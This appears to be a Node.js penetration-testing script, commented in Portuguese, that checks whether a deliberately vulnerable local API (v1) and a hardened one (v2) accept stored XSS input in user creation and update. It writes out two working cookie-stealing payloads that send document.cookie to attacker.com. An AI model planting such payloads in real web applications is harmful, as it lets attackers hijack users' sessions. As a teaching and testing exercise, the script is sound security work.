// Script para testar ataques Cross-Site Scripting (XSS)
const axios = require('axios');

const API_URL = 'http://localhost:3000/api/v1';
const API_URL_SECURE = 'http://localhost:3000/api/v2';

// Ataque XSS via criação de usuário
async function testXSSAttack() {
  try {
    console.log('\n--- Teste de XSS Attack (Criação de Usuário) ---');
    
    // Payload XSS malicioso
    const xssPayload = {
      username: '<script>alert("XSS Attack"); document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
      email: 'xss@example.com',
      password: 'password123'
    };
    
    console.log('Enviando payload XSS para API vulnerável:', JSON.stringify(xssPayload));
    
    const response = await axios.post(`${API_URL}/users`, xssPayload);
    
    console.log('Status da resposta:', response.status);
    console.log('Dados da resposta:', response.data);
    
    if (response.status === 201) {
      console.log('VULNERABILIDADE DETECTADA: Payload XSS aceito pela API v1!');
      console.log('Para confirmar a vulnerabilidade, acesse a página que exibe os usuários e verifique se o script é executado.');
    } else {
      console.log('API v1 provavelmente rejeitou o payload XSS.');
    }
    
    // Tentar o mesmo ataque na API segura
    try {
      console.log('\nEnviando o mesmo payload para API segura...');
      
      const secureResponse = await axios.post(`${API_URL_SECURE}/auth/register`, xssPayload);
      
      console.log('Status da resposta (API segura):', secureResponse.status);
      console.log('Dados da resposta (API segura):', secureResponse.data);
      
      if (secureResponse.status === 201) {
        console.log('FALHA DE SEGURANÇA: Payload XSS aceito pela API v2!');
      } else {
        console.log('API v2 está protegida contra este ataque, como esperado.');
      }
    } catch (secureError) {
      console.log('API v2 rejeitou o payload malicioso como esperado:', secureError.response?.status || secureError.message);
      if (secureError.response?.data) {
        console.log('Detalhes do erro (API segura):', secureError.response.data);
      }
    }
    
  } catch (error) {
    console.error('Erro ao testar XSS Attack:', error.message);
    if (error.response) {
      console.log('Status do erro:', error.response.status);
      console.log('Dados do erro:', error.response.data);
    }
  }
}

// Ataque XSS via atualização de usuário
async function testXSSAttackUpdate() {
  try {
    console.log('\n--- Teste de XSS Attack (Atualização de Usuário) ---');
    
    // Primeiro, criar um usuário normal na API vulnerável
    const normalUser = {
      username: 'normal_user',
      email: 'normal@example.com',
      password: 'password123'
    };
    
    console.log('Criando usuário normal na API v1...');
    const createResponse = await axios.post(`${API_URL}/users`, normalUser);
    const userId = createResponse.data.data.id;
    
    console.log(`Usuário criado com ID: ${userId}`);
    
    // Payload XSS malicioso para atualização
    const xssPayload = {
      username: '<img src="x" onerror="alert(\'XSS via update\'); fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)">',
      email: 'updated@example.com',
      password: 'password123'
    };
    
    console.log('Enviando payload XSS via atualização para API vulnerável:', JSON.stringify(xssPayload));
    
    const updateResponse = await axios.put(`${API_URL}/users/${userId}`, xssPayload);
    
    console.log('Status da resposta:', updateResponse.status);
    console.log('Dados da resposta:', updateResponse.data);
    
    if (updateResponse.status === 200) {
      console.log('VULNERABILIDADE DETECTADA: Payload XSS aceito pela API v1 na atualização!');
      console.log('Para confirmar a vulnerabilidade, acesse a página que exibe os usuários e verifique se o script é executado.');
    } else {
      console.log('API v1 provavelmente rejeitou o payload XSS na atualização.');
    }
    
    // Criar um usuário normal na API segura para testar atualização
    try {
      console.log('\nCriando usuário normal na API v2...');
      
      const secureUser = {
        username: 'secure_user',
        email: 'secure@example.com',
        password: 'Password123'
      };
      
      const secureCreateResponse = await axios.post(`${API_URL_SECURE}/auth/register`, secureUser);
      const secureToken = secureCreateResponse.data.token;
      const secureUserId = secureCreateResponse.data.data.id;
      
      console.log(`Usuário seguro criado com ID: ${secureUserId}`);
      
      // Tentar o mesmo ataque XSS na API segura
      console.log('Enviando payload XSS via atualização para API segura...');
      
      try {
        const secureUpdateResponse = await axios.put(`${API_URL_SECURE}/users/${secureUserId}`, xssPayload, {
          headers: {
            'Authorization': `Bearer ${secureToken}`
          }
        });
        
        console.log('Status da resposta (API segura):', secureUpdateResponse.status);
        console.log('Dados da resposta (API segura):', secureUpdateResponse.data);
        
        if (secureUpdateResponse.status === 200) {
          console.log('FALHA DE SEGURANÇA: Payload XSS aceito pela API v2 na atualização!');
        } else {
          console.log('API v2 está protegida contra este ataque na atualização, como esperado.');
        }
      } catch (secureUpdateError) {
        console.log('API v2 rejeitou o payload malicioso na atualização como esperado:', secureUpdateError.response?.status || secureUpdateError.message);
        if (secureUpdateError.response?.data) {
          console.log('Detalhes do erro (API segura):', secureUpdateError.response.data);
        }
      }
      
    } catch (secureError) {
      console.log('Erro ao criar usuário na API segura:', secureError.message);
      if (secureError.response) {
        console.log('Detalhes do erro:', secureError.response.data);
      }
    }
    
  } catch (error) {
    console.error('Erro ao testar XSS Attack via atualização:', error.message);
    if (error.response) {
      console.log('Status do erro:', error.response.status);
      console.log('Dados do erro:', error.response.data);
    }
  }
}

// Executar testes
async function runTests() {
  console.log('=======================================================');
  console.log('TESTES DE PENETRAÇÃO - CROSS-SITE SCRIPTING (XSS)');
  console.log('=======================================================');
  console.log('Este script testa ataques XSS nas APIs v1 (vulnerável) e v2 (segura).');
  console.log('Certifique-se de que ambas as APIs estão rodando antes de executar os testes.');
  console.log('=======================================================\n');
  
  await testXSSAttack();
  await testXSSAttackUpdate();
  
  console.log('\n=======================================================');
  console.log('TESTES CONCLUÍDOS');
  console.log('=======================================================');
  console.log('Resumo:');
  console.log('1. A API v1 deve ser vulnerável a ataques XSS');
  console.log('2. A API v2 deve estar protegida contra esses ataques');
  console.log('=======================================================');
}

// Executar testes
runTests();